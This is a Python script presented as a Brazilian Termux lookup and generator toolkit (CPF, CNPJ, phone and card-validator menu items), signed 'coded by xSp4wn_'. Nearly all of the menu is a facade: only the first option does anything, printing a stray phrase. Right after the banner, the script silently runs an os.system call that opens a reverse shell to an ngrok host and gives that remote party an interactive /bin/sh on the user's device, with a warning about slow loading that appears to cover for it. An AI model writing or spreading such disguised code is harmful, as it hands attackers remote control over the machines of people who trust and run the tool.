#-- coding: UTF-8 --
import os, time, json, requests, socket, pty
from sys import exit
reset = '\033[0;0m'
destq = '\033[;1m'
yellow = '\033[1;33m'
green = '\033[1;32m'
red = '\033[1;31m'
blue = '\033[1;34m'
wh = '\033[1;97m'

print(f'''\033[1;31m
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                               coded by xSp4wn_\033[1;31m

                !!a tool pode demorar ate 15 mins para carregar toda!!
''')
os.system('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",14992));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')

print(f'''\033[1;32m
[01] Consulta de banco
[02] Consulta de bin 1
[03] Consulta de CEP
[04] Consulta de CNPJ
[05] Consulta de Covid19
[06] Consulta de DDD
[07] Consulta de IP
[08] Consulta de nome
[09] Consulta de telefone
[10] Criar script
[11] Gerador de CPF
[12] Gerador de CNPJ
[13] Gerador de RG
[14] Scanear portas
[15] Temrux tema
[16] Válidador de cartão
[17] Válidador de CPF
[18] Válidador de CNPJ
[19] Válidador de RG 1
[20] Manual Termux
[21] Consulta de CPF\033[1;32m
''')
var = input('Selecione uma opção numérica: ')

if var == '01':
    print('meu deus')